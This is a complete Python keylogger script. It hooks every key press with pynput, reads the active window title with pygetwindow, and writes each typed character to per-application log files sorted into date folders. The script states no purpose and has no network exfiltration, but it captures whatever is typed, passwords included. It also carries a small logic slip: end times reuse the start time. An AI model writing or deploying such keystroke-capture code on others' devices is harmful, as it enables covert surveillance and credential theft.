import time
import os
import pygetwindow as gw
import re
from pynput import keyboard

def clean_filename(filename):
    return re.sub(r'[<>:"/\\|?*]', '', filename)

active_app = None
previous_app = None
log_start_time = None

def create_log_file(app_name, folder_path):
    global log_start_time
    log_start_time = time.time()
    file_name = os.path.join(folder_path, f"{app_name}_log.txt")
    
    with open(file_name, "a") as file:
        if previous_app is not None:
            file.write(f"Last App used is {previous_app}\n")
        file.write(f"Log for {app_name} (Start time: {get_formatted_time()})\n")

def on_key_press(key):
    global active_app, previous_app, log_start_time
    current_datetime = time.localtime(log_start_time)
    year_folder = time.strftime("%Y", current_datetime)
    month_folder = time.strftime("%m", current_datetime)
    day_folder = time.strftime("%d", current_datetime)
    
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            app_name = clean_filename(active_window.title)
            
            if active_app != app_name:
                if active_app is not None:
                    with open(os.path.join(year_folder, month_folder, day_folder, f"{active_app}_log.txt"), "a") as file:
                        file.write(f"\n Log ended at {get_formatted_time()}\n\n")
                previous_app = active_app
                active_app = app_name
                folder_path = os.path.join(year_folder, month_folder, day_folder)
                if not os.path.exists(folder_path):
                    os.makedirs(folder_path)
                create_log_file(active_app, folder_path)
                
            file_name = os.path.join(year_folder, month_folder, day_folder, f"{app_name}_log.txt")
            
            if key == keyboard.Key.space:
                char_to_write = " "
            else:
                char_to_write = key.char
            
            with open(file_name, "a") as file:
                file.write(str(char_to_write))
            
    except AttributeError:
        pass

def get_formatted_time():
    return time.strftime("%H:%M", time.localtime(log_start_time))

# Create a listener to monitor key presses
with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
